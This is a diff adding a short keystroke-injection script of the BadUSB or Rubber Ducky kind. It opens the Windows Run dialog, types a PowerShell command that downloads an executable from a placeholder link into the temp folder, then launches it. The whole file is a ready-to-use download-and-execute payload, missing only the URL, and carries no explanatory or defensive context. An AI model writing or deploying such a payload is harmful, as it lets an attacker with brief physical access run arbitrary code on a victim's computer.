@@ -1,0 +1,7 @@
+DELAY 3000
+GUI r
+DELAY 100
+PRINT powershell (new-object System.Net.WebClient).DownloadFile('LINK HERE','%TEMP%\\temp.exe');
+DELAY 100
+PRINTLN Start-Process "%TEMP%\\temp.exe"
+ENTER
